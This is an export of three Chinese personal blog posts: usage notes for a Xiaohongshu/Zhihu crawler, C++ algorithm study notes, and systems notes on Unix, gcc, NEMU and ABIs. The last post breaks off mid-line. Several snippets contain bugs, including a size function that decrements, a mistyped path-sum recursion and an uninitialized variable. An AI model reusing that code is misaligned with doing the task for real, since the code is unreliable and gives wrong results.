[{"content":"小红书爬虫 1 python main.py --paltform xhs --lt qrcode --type search 修改了config下的配置文件，最好不要开并发，会发现爬了一段时间爬不了，修改keywords为实体清单，db_config为nkuwiki数据库配置，使用GET_IMAGES和GET_COMMENT，分两次爬取，一次导入数据库，一次导入本地以json格式，改START_DAY和END_DAY\n知乎爬虫 1 python main.py --platform zhihu --lt qrcode --type search 同上，图片和评论不开,可以并发爬取，最多爬取页数1000\nQA：如何处理数据，渲染s？\n泪了，utools下自己加了个脚本\n1 python utools/xhs_to_md.py 输出在docs/xhs下\n1 python scripts/zhihu_json_to_md.py 输出在data/zhihu/markdown下\n","date":"2025-03-23T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nkuwiki%E7%88%AC%E8%99%AB%E8%AF%B4%E6%98%8E/","title":"NKUwiki爬虫说明"},{"content":"数组 二分法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution { public: int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { int left = 0 ; int right =nums.size()-1; while (left \u0026lt;= right ){ int middle = left + ((right-left)/2); if (target \u0026lt; nums[middle]){ right = middle-1; } else if (target \u0026gt; nums[middle]){ left = middle+1; }else{ return middle; } } return -1; } }; 翻转链表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution { public: ListNode* reverseList(ListNode* head) { ListNode* temp; ListNode* cur = head; ListNode* pre = NULL; while(cur){ temp=cur-\u0026gt;next;//暂时保存cur的下一个节点 cur-\u0026gt;next=pre;//反转 pre=cur;//更新pre和cur指针 cur=temp; } return pre; } }; 环形链表\n先找环形链表相遇点\n从头结点出发一个指针，从相遇节点 也出发一个指针，这两个指针每次只走一个节点， 那么当这两个指针相遇的时候就是 环形入口的节点。\n枚举 一个数组中的数互不相同，求其中和为 的数对的个数\n1 2 3 4 5 6 7 int ans = 0; for(int i=0;i\u0026lt;n;i++) for(int j=0;j\u0026lt;i;j++) if (a[i]+a[j]=0) ++ans; 优化后\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;cstring\u0026gt; constexpr int MAXN = 100000; //MAXN是数组内元素的界 int solve(int n,int a[]){ bool met[MAX*2+1];//创建一个能装下[-MAXN,MAXN]的桶 memset(met,0,sizeof(met)); int ans = 0; for(int i =0;i\u0026lt;n;++i){ if(met[MAXN-a[i]]) ++ans;//如果桶内有想要的元素，ans加一 met[MAXN+a[i]]=true;//把当前元素放入桶 } return ans; } 个人理解，一开始把桶初始化全部为false，第一个出现元素，ans还是为0，但是把这个元素放入桶内，比如假设 MAXN = 100000，数组 a[] = [1, -1, 2, -2, 3]，n = 5，遍历数组，a[0]=1,MAXN-1=99999，met[99999]为false,-1还没出现过，将met[MAXN+1]=met[100001]设为true,找第二个数a[1]=-1，met[MAXN-(-1)]=met[100001]为true，1已经出现过，ans++,然后将met[MAXN+(-1)]=met[99999]设置为TRUE\u0026hellip;\u0026hellip;时间复杂度为O(n)\n模拟 一只长度不计的蠕虫位于 英寸深的井的底部。它每次向上爬 英寸，但是必须休息一次才能再次向上爬。在休息的时候，它滑落了 英寸。之后它将重复向上爬和休息的过程。蠕虫爬出井口需要至少爬多少次？如果蠕虫爬完后刚好到达井的顶部，我们也设作蠕虫已经爬出井口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;iostream\u0026gt; int main(){ int n ,u,d; std::cin\u0026gt;\u0026gt;u\u0026gt;\u0026gt;d\u0026gt;\u0026gt;n; int dist,chance = 0; while(1){ dist+=u; chance++; if(dist\u0026gt;=n)break; dist -= d; } std::cout \u0026lt;\u0026lt; chance \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 0; } 递归\u0026amp;分治 在函数中调用自身\n结束条件 自我调用 1 2 3 4 5 6 7 8 9 int size(Node *head){ int size=0; for(Node *p=head;p !=nullptr;p=p-\u0026gt;next) size--; return size; } int size_recursion(Node *head){ if(head == nullptr) return 0; return size_recursion(head-\u0026gt;next)+1; } 给定一个二叉树，它的每个结点都存放着一个整数值。\n找出路径和等于给定数值的路径总数。\n路径不需要从根节点开始，也不需要在叶子节点结束，但是路径方向必须是向下的（只能从父节点到子节点）。\n二叉树不超过 1000 个节点，且节点数值范围是 [-1000000,1000000] 的整数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 struct TreeNode{ int val; TreeNode *left; TreeNode *right; TreeNode(int x ):val(x),left(nullptr),right(nullptr); } int count (TreeNode *node ,int sum){ if (node ==nullptr) return 0; return (node -\u0026gt; val == sum)+ count(node-\u0026gt;left,sum=node-\u0026gt;val)+count(node-\u0026gt;right,sum-node-\u0026gt;val); } int pathSum(TreeNode *root,int sum){ if(root == nullptr)return 0 ; return count(root,sum)+pathSum(root-\u0026gt;left,sum)+pathSum(root-\u0026gt;right,sum); } pathSum函数，二叉树的遍历框架，分别对左右左子树递归调用函数本省\ncount函数每个节点和子树\n贪心算法 排序解法 恰逢 H 国国庆，国王邀请 n 位大臣来玩一个有奖游戏。首先，他让每个大臣在左、右手上面分别写下一个整数，国王自己也在左、右手上各写一个整数。然后，让这 n 位大臣排成一排，国王站在队伍的最前面。排好队后，所有的大臣都会获得国王奖赏的若干金币，每位大臣获得的金币数分别是：排在该大臣前面的所有人的左手上的数的乘积除以他自己右手上的数，然后向下取整得到的结果。\n国王不希望某一个大臣获得特别多的奖赏，所以他想请你帮他重新安排一下队伍的顺序，使得获得奖赏最多的大臣，所获奖赏尽可能的少。注意，国王的位置始终在队伍的最前面。\noperator\u0026lt;：比较当前对象*this和传入对象x\n1 2 3 4 5 6 7 struct uv{ int a,b; bool operator\u0026lt;(const uv \u0026amp;x) const{ return max(x.b,a*b)\u0026lt;max(b,x.a*x.b) } }; 后悔解法 字符串 反转字符串 1 2 3 4 5 6 7 8 class Solution { public: void reverseString(vector\u0026lt;char\u0026gt;\u0026amp; s) { for(int i =0,j=s.size()-1;i\u0026lt;s.size()/2;i++,j--){ swap(s[i],s[j]); } } }; swap的两种实现\n1 2 3 int tmp = s[i]; s[i]=s[j]; s[j]=tmp; 1 2 3 s[i]^=s[j]; s[j]^=s[i]; s[i]^=s[j]; 反转字符串2 给定一个字符串 s 和一个整数 k，从字符串开头算起, 每计数至 2k 个字符，就反转这 2k 个字符中的前 k 个字符。\n如果剩余字符少于 k 个，则将剩余字符全部反转。\n如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。\n示例:\n输入: s = \u0026ldquo;abcdefg\u0026rdquo;, k = 2 输出: \u0026ldquo;bacdfeg\u0026rdquo;\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: string reverseStr(string s, int k) { for(int i =0;i\u0026lt;s.size();i+=(2*k)){ if(i+k\u0026lt;=s.size()){ reverse(s.begin()+i,s.begin()+i+k); }else{//剩余字符少于k个，则全部反转 reverse(s.begin()+i,s.end()); } } return s; } }; 注意for的构造\n翻转字符串的单词 去除多余空格 全部翻转 对于每个单词单独反转 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 class Solution { public: void reverse(string\u0026amp;s,int start,int end){ for(int i = start,j=end;i\u0026lt;j;i++,j--){ swap(s[i],s[j]); } } void removeExtraSpaces(string\u0026amp; s) { int slowIndex = 0, fastIndex = 0; // 定义快指针，慢指针 // 去掉字符串前面的空格 while (s.size() \u0026gt; 0 \u0026amp;\u0026amp; fastIndex \u0026lt; s.size() \u0026amp;\u0026amp; s[fastIndex] == \u0026#39; \u0026#39;) { fastIndex++; } for (; fastIndex \u0026lt; s.size(); fastIndex++) { // 去掉字符串中间部分的冗余空格 if (fastIndex - 1 \u0026gt; 0 \u0026amp;\u0026amp; s[fastIndex - 1] == s[fastIndex] \u0026amp;\u0026amp; s[fastIndex] == \u0026#39; \u0026#39;) { continue; } else { s[slowIndex++] = s[fastIndex]; } } if (slowIndex - 1 \u0026gt; 0 \u0026amp;\u0026amp; s[slowIndex - 1] == \u0026#39; \u0026#39;) { // 去掉字符串末尾的空格 s.resize(slowIndex - 1); } else { s.resize(slowIndex); // 重新设置字符串大小 } } string reverseWords(string s) { removeExtraSpaces(s);//去除多余空格，保证单词之间只有一个空格，且字符串首尾没空格 reverse(s,0,s.size()-1); int start=0; for(int i=0;i\u0026lt;=s.size();++i){ if(i==s.size()||s[i]==\u0026#39; \u0026#39;){//到达空格或者单词最后 reverse(s,start,i-1);//反转，注意是左闭右闭 start = i+1;//更新下一个单词的start } } return s; } }; 双指针解法，加深理解，快指针有试验的性质，如果有多个空格跳到最后一个空格让慢指针同步\n重复的子字符串 判断字符串s是否有重复字串，只要两个s拼接在一起，里面还出现一个s的话（掐头去尾避免找的是原先的s），就说明是由重复字串组成\n1 2 3 4 5 6 7 8 9 10 11 class Solution { public: bool repeatedSubstringPattern(string s) { string t =s+s; t.erase(t.begin()); t.erase(t.end()-1);//掐头去尾 if(t.find(s)!=std::string::npos) {return true; }else{return false;} } }; 哈希表 有效的字母异位词 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: bool isAnagram(string s, string t) { int record[26]={0};//初始化为0 for(int i=0;i\u0026lt;s.size();i++){ record[s[i]-\u0026#39;a\u0026#39;]++; } for(int i = 0;i\u0026lt;t.size();i++){ record[t[i]-\u0026#39;a\u0026#39;]--; } for (int i=0;i\u0026lt;26;i++){ if (record[i]!=0){ return false; } } return true; } }; 如果两个单词是异位词的话，那么最终record元素应该全部都为0\n两个数组的交集 注意，使用数组来做哈希的题目，是因为题目限制了数值的大小，而这道题目没有限制数值的大小，就无法使用数组来做哈希表\nstd::set元素唯一且有序，不支持直接修改元素，必须先删除再插入 std::multiset元素可以重复且有序，不支持直接修改元素，必须先删除再插入 std::unordered_set元素唯一且无序，不支持直接修改元素，必须先删除再插入 std::set和std::multiset底层实现都是红黑树，std::unordered_set的底层实现是哈希表， 使用unordered_set 读写效率是最高的，并不需要对数据进行排序，而且还不要让数据重复，所以选择unordered_set。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: vector\u0026lt;int\u0026gt; intersection(vector\u0026lt;int\u0026gt;\u0026amp; nums1, vector\u0026lt;int\u0026gt;\u0026amp; nums2) { unordered_set\u0026lt;int\u0026gt; result_set;//存放结果 int hash[1005]={0}; for(int num:nums1){//每次循环nums1的值都会赋给num hash[num]=1; } for (int num:nums2){ if(hash[num]==1){ result_set.insert(num); } } return vector\u0026lt;int\u0026gt;(result_set.begin(),result_set.end()); } }; 很巧妙的解法，相当于hash是个映射表，先把nums1映射到hash表上，映射方式就是查找位置，在查询nums2元素在hash表上的位置，也是用同样的方式，有点像加密算法（只不过这个算法很简单）\n快乐数 编写一个算法来判断一个数 n 是不是快乐数。\n「快乐数」定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。如果 可以变为 1，那么这个数就是快乐数。\n如果 n 是快乐数就返回 True ；不是，则返回 False 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution { public: int getSum(int n) {//计算各位数的平方和 int sum=0; while(n){ sum+=(n%10)*(n%10); n/=10; } return sum; } bool isHappy(int n){ unordered_set\u0026lt;int\u0026gt; set; while(1){ int sum = getSum(n); if(sum == 1){ return true; } if(set.find(sum)!=set.end()){//检查sum出现在容器中，如果sum曾经出现过，说明已经陷入了无线循环，立刻return false return false; }else{ set.insert(sum); } n=sum; } } }; 两数之和 给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。\n示例:\n给定 nums = [2, 7, 11, 15], target = 9\n因为 nums[0] + nums[1] = 2 + 7 = 9\n所以返回 [0, 1]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution { public: vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) { std::unordered_map \u0026lt;int,int\u0026gt; map; for(int i=0;i\u0026lt;nums.size();i++){ //寻找是否有匹配的key，auto用来自动匹配数值类型 auto iter = map.find(target-nums[i]); if(iter!=map.end()){//iter是否在容器中 return {iter -\u0026gt;second,i};//iter-\u0026gt;second 是匹配键对应的值（即之前存储的下标），返回两个下标 } map.insert(pair\u0026lt;int,int\u0026gt;(nums[i],i));//如果没找到匹配对，就把访问过的元素和下标加入到map中 } return{}; } }; QA1:为什么会想到用哈希表？\n判断元素是否存在\nQA2:哈希表为什么用map？\n个人认为map有点像python里面的字典，可以查询键值对。\n数组的大小是受限制的，而且如果元素很少，而哈希值太大会造成内存空间的浪费。 set是一个集合，里面放的元素只能是一个key，而两数之和这道题目，不仅要判断y是否存在而且还要记录y的下标位置，因为要返回x 和 y的下标。所以set 也不能用。 此时就要选择另一种数据结构：map ，map是一种key value的存储结构，可以用key保存数值，用value再保存数值所在的下标。不需要key有序，选择std:unordered_map效率更高\nQA3：本题的map是用来存什么的？\n存放访问过的元素\nQA4：map中的key和value用来存什么？\nkey：数组元素，value：数组元素下标\n赎金信 给定一个赎金信 (ransom) 字符串和一个杂志(magazine)字符串，判断第一个字符串 ransom 能不能由第二个字符串 magazines 里面的字符构成。如果可以构成，返回 true ；否则返回 false。\n(题目说明：为了不暴露赎金信字迹，要从杂志上搜索各个需要的字母，组成单词来表达意思。杂志字符串中的每个字符只能在赎金信字符串中使用一次。)\n注意：\n你可以假设两个字符串均只含有小写字母。\ncanConstruct(\u0026ldquo;a\u0026rdquo;, \u0026ldquo;b\u0026rdquo;) -\u0026gt; false canConstruct(\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;ab\u0026rdquo;) -\u0026gt; false canConstruct(\u0026ldquo;aa\u0026rdquo;, \u0026ldquo;aab\u0026rdquo;) -\u0026gt; true\n发一：暴力破解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution { public: bool canConstruct(string ransomNote, string magazine) { for (int i = 0; i \u0026lt; magazine.length(); i++) { for (int j = 0; j \u0026lt; ransomNote.length(); j++) { if (magazine[i] == ransomNote[j]) { ransomNote.erase(ransomNote.begin() + j); break; } } } if (ransomNote.length() == 0) { return true; } return false; } }; 遇到相同的字符，就把ransomNote中的字符删除，如果最后ransomNote为0，则返回true\n法二：哈希表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution { public: bool canConstruct(string ransomNote, string magazine) { int record[26] = {0}; //add if (ransomNote.size() \u0026gt; magazine.size()) { return false; } for (int i = 0; i \u0026lt; magazine.length(); i++) { // 通过record数据记录 magazine里各个字符出现次数 record[magazine[i]-\u0026#39;a\u0026#39;] ++; } for (int j = 0; j \u0026lt; ransomNote.length(); j++) { // 遍历ransomNote，在record里对应的字符个数做--操作 record[ransomNote[j]-\u0026#39;a\u0026#39;]--; // 如果小于零说明ransomNote里出现的字符，magazine没有 if(record[ransomNote[j]-\u0026#39;a\u0026#39;] \u0026lt; 0) { return false; } } return true; } }; QA：为什么用数组而不是map？\nmap要维护红黑树或哈希表，空间消耗更大\n栈与队列 用栈实现队列 要有两个栈，一个In，一个Out，终点删除元素，先把In栈里面的push到Out栈中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 class MyQueue { public: stack\u0026lt;int\u0026gt; stIn; stack\u0026lt;int\u0026gt; stOut; MyQueue() { } void push(int x) { stIn.push(x); } int pop() {//将队列的第一个元素移除，并且返回这个元素 if(stOut.empty()){ while(!stIn.empty()){ stOut.push(stIn.top()); stIn.pop(); } } int result = stOut.top(); stOut.pop(); return result; } int peek() {//get the front element int res = this-\u0026gt;pop();//对当前对象调用pop() stOut.push(res);//pop()弹出了元素res，现在再添加回去，不改变 return res; } bool empty() { return stIn.empty()\u0026amp;\u0026amp;stOut.empty(); } }; 用队列实现栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 class MyStack { public: queue\u0026lt;int\u0026gt; que1; queue\u0026lt;int\u0026gt; que2; MyStack() { } void push(int x) { que1.push(x); } int pop() { int size = que1.size(); size--; while(size--){//将que1导入que2，但要留下最后一个元素 que2.push(que1.front()); que1.pop(); } int result = que1.front();//留下的最后一个元素就是要返回的值 que1.pop(); que1 = que2; while(!que2.empty()){//清空que2，que2相当于一个工具了 que2.pop(); } return result; } int top() { int size = que1.size(); size--; while(size--){//将que1导入que2，但要留下最后一个元素 que2.push(que1.front()); que1.pop(); } int result = que1.front(); que2.push(que1.front());//获取值后将最后一个元素也加入que2中，保持原本的结构不变 que1.pop(); que1=que2; while(!que2.empty()){ que2.pop(); } return result; } bool empty() { return que1.empty(); } }; 总的思想就是把que1导入que2，但要留下一个元素，存储这个元素，然后对这个元素操作/不操作，恢复原来的队列，que2相当于一个桥梁工具\n匹配括号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution { public: bool isValid(string s) { if(s.size()%2!=0)return false;//如果长度为奇数，一定不符合要求 stack\u0026lt;char\u0026gt; st; for(int i = 0;i\u0026lt;s.size();i++){ if(s[i]==\u0026#39;(\u0026#39;) st.push(\u0026#39;)\u0026#39;); else if(s[i]==\u0026#39;{\u0026#39;) st.push(\u0026#39;}\u0026#39;); else if (s[i]==\u0026#39;[\u0026#39;) st.push(\u0026#39;]\u0026#39;); //遍历左括号，检查st else if (st.empty()|| st.top()!=s[i]) return false;//如果还在遍历，st已经为空，或者遍历找不到不匹配 else st.pop();//st.top()与s[i]相等，栈弹出元素 } return st.empty(); } }; 经典题了，s有做左括号就放入st相应的右括号，s有右括号就检查st中有无一样的右括号\n逆波兰表达式求值 展示了计算机如何思考，如果是中缀表达式，计算机得先从左到右遍历一遍再按回过头来优先级，如 ( 1 + 2 ) * ( 3 + 4 ) ，但如果是后缀表达式加不加括号无所谓因为顺序就是从左往右，如 ( ( 1 2 + ) ( 3 4 + ) * )\n思考：把tokens里面的数字入栈，遇到运算符不入栈，把栈里面的两个数字取出来，反过来做运算，再把这个数字入栈\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution { public: int evalRPN(vector\u0026lt;string\u0026gt;\u0026amp; tokens) { stack\u0026lt;long long\u0026gt; st; for(int i=0;i\u0026lt;tokens.size();i++){ if(tokens[i]==\u0026#34;+\u0026#34;||tokens[i]==\u0026#34;-\u0026#34;||tokens[i]==\u0026#34;*\u0026#34;||tokens[i]==\u0026#34;/\u0026#34;){ long long num1 = st.top(); st.pop(); long long num2 = st.top(); st.pop(); if(tokens[i]==\u0026#34;+\u0026#34;) st.push(num2+num1); if(tokens[i]==\u0026#34;-\u0026#34;) st.push(num2-num1); if(tokens[i]==\u0026#34;*\u0026#34;) st.push(num2*num1); if(tokens[i]==\u0026#34;/\u0026#34;) st.push(num2/num1); }else{ st.push(stoll(tokens[i]));//stoll()将函数转换成long long int } } auto result = st.top(); return result; } }; 二叉树 1 2 3 4 5 6 struct TreeNode { int val; TreeNode *left; TreeNode *right; TreeNode(int x):val(x),left(NULL),right(NULL){} } 递归遍历 前序：中左右\n中序：左中右\n后序：左右中\n二叉树的直径 给你一棵二叉树的根节点，返回该树的 直径 。\n二叉树的 直径 是指树中任意两个节点之间最长路径的 长度 。这条路径可能经过也可能不经过根节点 root 。\n两节点之间路径的 长度 由它们之间边数表示。\n思路：一个节点为起点的经过节点数的最大值为dn，那么二叉树的直径就是所有节点dn的最大值减一\n子树深度为max(L,R)\ndn为L+R+1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { int ans; int depth(TreeNode* rt){ if(rt == NULL){ return 0; } int L=depth(rt-\u0026gt;left);//左儿子为根的子树的深度 int R=depth(rt-\u0026gt;right);//右二子为根的子树的深度 ans = max(ans,L+R+1);//更新计算ans return max(L,R)+1;//返回该节点为根的子树的深度 } public: int diameterOfBinaryTree(TreeNode* root) { ans =1; depth(root); return ans-1; } }; 翻转二叉树 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: TreeNode* invertTree(TreeNode* root) { if(root == NULL){ return 0; } TreeNode* L = invertTree(root-\u0026gt;left); TreeNode* R = invertTree(root-\u0026gt;right); root-\u0026gt;left = R; root-\u0026gt;right = L; return root; } }; ","date":"2025-03-21T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"数据结构与算法"},{"content":"Unix is a user-friendly. It\u0026rsquo;s just selective about who its friends are.\nUnix哲学 KISS：Keep it simple,stupid.\nEverything is a file and pipeline programs to work together.\n每个工具只做一件事情，但做到极致\n小工具统一文本输入输出，易于使用\n使用管道进行组合\nman -k xxx 检索关键字XXX的命令\necho $?查看上一条指令的退出状态\ngcc -E -S -c -o\n.c -\u0026gt; .i -\u0026gt; .s -\u0026gt; .o -\u0026gt; .out\n元编程：定义自己的语言，但是不破坏可读性\n函数的调用就是栈的生长\n.o -\u0026gt; .out就是重定向的过程，.o不知道所调用函数位置，链接后填入函数地址会有偏移\nC程序执行的两个视角\n静态：C 代码的连续一段总能对应到一段连续的机器指令 动态：C 代码执行的状态总能对应到机器的状态 Segmentation fault报错：已超过这块内存允许的权限来操作\n大多数机器采用小端，容易对齐\nlong在32位上是4个字节，在64位是8个字节\n只要是个指针，32位机就是4个字节，64位就是8个字节，指针在内存中的存储是个地址\n1 void (*signal (int sig, void (*func)(int)))(int); 参数为(int sig, void (*func)(int)),*函数返回值，为int型\n拿到项目后 make构建\nmake run跑一下\n看看Makefile怎么构建的\n大致了解下项目总体结构\ntree find \u0026hellip; | xargs cat | wc –l 将find找到的文件列表传给cat，cat依次读取文件内容，wc -l统计所有文件的总行数\n1 find . -name \u0026#34;*.c\u0026#34; -o -name \u0026#34;*.h\u0026#34; | xargs cat | wc -l 266807\n找到入口点main\n1 grep -n main $(find . -name \u0026#34;*.c\u0026#34;) 1 grep -nr \u0026#34;\\bmain\\b\u0026#34; nemu/src 正则表达式，main以单词形式出现\nvim $(fzf)可以以树的方式直接跳转某个文件\n(gdb)layout src :打开源码\n两种运行方式\nmake run ./build/riscv32-nemu-interpreter 怎么给nemu传指令\necho \u0026lsquo;help\u0026rsquo; | ./build/riscv32-nemu-interpreter cat in.txt | ./build/riscv32-nemu-interpreter ./build/riscv32-nemu-interpreter \u0026lt; in.txt 回归测试的脚本？\nparse_args()函数，解析命令行参数\n1 2 3 4 5 6 7 8 9 10 static int parse_args(int argc, char *argv[]) { const struct option table[] = { {\u0026#34;batch\u0026#34; , no_argument , NULL, \u0026#39;b\u0026#39;}, {\u0026#34;log\u0026#34; , required_argument, NULL, \u0026#39;l\u0026#39;}, {\u0026#34;diff\u0026#34; , required_argument, NULL, \u0026#39;d\u0026#39;}, {\u0026#34;port\u0026#34; , required_argument, NULL, \u0026#39;p\u0026#39;}, {\u0026#34;help\u0026#34; , no_argument , NULL, \u0026#39;h\u0026#39;}, {0 , 0 , NULL, 0 }, }; int o; static\n如果在两个文件里定义了重名的函数，能够分别百衲衣，但链接会出错，加了一个static，约束可见的范围，使不会触发函数得重名，nemu框架得逻辑：只要是函数就加static\n/riscv32/**/reg.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #ifndef __RISCV_REG_H__ #define __RISCV_REG_H__ #include \u0026lt;common.h\u0026gt; static inline int check_reg_idx(int idx) { IFDEF(CONFIG_RT_CHECK, assert(idx \u0026gt;= 0 \u0026amp;\u0026amp; idx \u0026lt; MUXDEF(CONFIG_RVE, 16, 32))); return idx; } #define gpr(idx) (cpu.gpr[check_reg_idx(idx)]) static inline const char* reg_name(int idx) { extern const char* regs[]; return regs[check_reg_idx(idx)]; } #endif ​\n运行时间短，但是调用频繁，static inline int建议编译器用内联函数的方式展开，不调用函数，而是在调用点直接展开，以空间换时间\nmonitor.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 void init_monitor(int argc, char *argv[]) { /* Perform some global initialization. */ /* Parse arguments. */ parse_args(argc, argv); /* Set random seed. */ init_rand(); /* Open the log file. */ init_log(log_file); /* Initialize memory. */ init_mem(); /* Initialize devices. */ IFDEF(CONFIG_DEVICE, init_device()); /* Perform ISA dependent initialization. */ init_isa(); /* Load the image to memory. This will overwrite the built-in image. */ long img_size = load_img(); /* Initialize differential testing. */ init_difftest(diff_so_file, img_size, difftest_port); /* Initialize the simple debugger. */ init_sdb(); IFDEF(CONFIG_ITRACE, init_disasm()); /* Display welcome message. */ welcome(); } 人机交互，以默认行缓冲的方式交互，没有换行符是不会进行I/O交互，每读到一个换行符\\n，就会释放缓冲区\n**/debug.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;common.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;utils.h\u0026gt; #define Log(format, ...) \\ _Log(ANSI_FMT(\u0026#34;[%s:%d %s] \u0026#34; format, ANSI_FG_BLUE) \u0026#34;\\n\u0026#34;, \\ __FILE__, __LINE__, __func__, ## __VA_ARGS__) #define Assert(cond, format, ...) \\ do { \\ if (!(cond)) { \\ MUXDEF(CONFIG_TARGET_AM, printf(ANSI_FMT(format, ANSI_FG_RED) \u0026#34;\\n\u0026#34;, ## __VA_ARGS__), \\ (fflush(stdout), fprintf(stderr, ANSI_FMT(format, ANSI_FG_RED) \u0026#34;\\n\u0026#34;, ## __VA_ARGS__))); \\ IFNDEF(CONFIG_TARGET_AM, extern FILE* log_fp; fflush(log_fp)); \\ extern void assert_fail_msg(); \\ assert_fail_msg(); \\ assert(cond); \\ } \\ } while (0) #define panic(format, ...) Assert(0, format, ## __VA_ARGS__) #define TODO() panic(\u0026#34;please implement me\u0026#34;) #endif #define assert(cond) if(!(cond)) panic(\u0026hellip;.);\n宏的展开可能会打乱计算的优先级顺序，使用do{}while(0)是为了防止宏展开打破。\nKconfig管理配置宏\n数据的机器级表述 如何取字节？\n如x=0101，要把右边第二位取出来，(x\u0026raquo;1)\u0026amp;1\n再如\n(x\u0026raquo;16)\u0026amp;11111111\n就是丢掉不用的位\n交换高/低16位((x \u0026amp; 0xFFFF)\u0026laquo;16)，((x\u0026raquo;16)\u0026amp;0xFFFF)\n测试𝑥 ∈ 𝑆，(S \u0026raquo; x) \u0026amp; 1\n求 𝑆! = 𝑆 ∪ {𝑥}，S | (1 \u0026laquo; x)\n求|S|，S二进制表示有多少个1\n单指令多数据 \u0026amp;，|，~对于整数里的每一个bit来说是独立（并行）的\nBit Set\n任意位，位运算是对所有bit同时完成的，省空间，程序执行中，内存优先级不同，速度不同，对cache的占用比较小\n补码：各位取反末尾加一\nUndefined Behaviour 警惕整数溢出\n移位操作不能超出数据长度\n如果有UB行为，用不同gcc优化行为，输出是不确定的\n如果在试图访问一块内存时，访问到这块内存之外的一块内存，比如数组越界，但是还是在栈上，可能是页的边界读到了值\n编译器优化 -fsanitize\n如何实现在每一次指针访问时，都增加一个断言assert(obj-\u0026gt;low \u0026lt;= ptr \u0026amp;\u0026amp; ptr \u0026lt; obj-\u0026gt;high);\n1 gcc –fsanitize=undefined a.c \u0026amp;\u0026amp; ./a.out ABI和内联汇编 机器字长式处理器能够直接进行整数或者位运算大小，代表一个指针最多多少位\n现在处理器一般实现48bit物理地址\n晶体管是以数字逻辑电路形式，logic units组成计算单元，\u0026hellip;.，包含在ALU中，汇编器如何翻译，硬件如何解读01串，要遵循ISA协议\nQA：只要有ISA协议真的足够了吗？\n需要ABI\n约定binary的行为\n二进制文件的格式 函数调用，系统调用，如printf需要借助外部的库函数，如libc 链接，加载 cdecl函数调用 caller stack frame\n所有参数都以数组的形式保存在堆栈上，例子，反序压栈，f(x,y)，y,x,f从高地址到低地址 返回地址 跳转到callee 调用方寄存器%eax,%ebx,%ecd,被调用方寄存器%edi，先存下来，函数退出时要恢复调用前的值，调用方负责反序压栈，被调用方负责执行就行\nOS，栈，\u0026hellip;\u0026hellip;，堆，data，代码，\nPC指向代码块\n在X86上，寄存器数量有限，基于栈传参\n使用寄存器传递参数：rdi,rsi,rdx,rcx,r8,r9\ncallee可以随意修改这6个寄存器的值 编译器有了更大的调度空间 交换两个指针指向的数字\nI/O设备 设备=一组寄存器，每次可以交换一定数量的数据\n设备-处理器接口\nCPU通过PMIO.PIO访问\nPort-mapped I/O (PMIO) //很老的做法\nCPU和内存地址分离？\n• I/O地址空间（port） • CPU直连I/O总线\nMemory-mapped I/O(MMIO)\n直观:使用普通内存读写指令 带来一些设计和实现的麻烦，编译器优化，乱序执行 80s如何打印？\n不是发送数据，而是执行指令\n两个特殊的I/O设备 总线\nPCI总线协议 CPU连接总线 总线连接其他总线 中断控制器\n中断设计是为了弥补I/O设备的速度缺陷\n管理多个产生中断的设备\n汇总成一个中断信号给CPU\n支持中断的屏蔽，优先级管理等\n中断=硬件驱动的函数调用，相当于在每条语句后都插入intterrupt_handler();\n栈和堆之间的空闲区域做文件映射，l.bc.so,map系统调用映射同步\n中断，从用户态切换到内核态，同一个CPU上可以做不同任务，多线程\n进程=分时多线程+虚拟存储\n链接与加载 0001 0100 jmp 0100 ;如果发生偏移怎么办？\n0001 0000 jmp 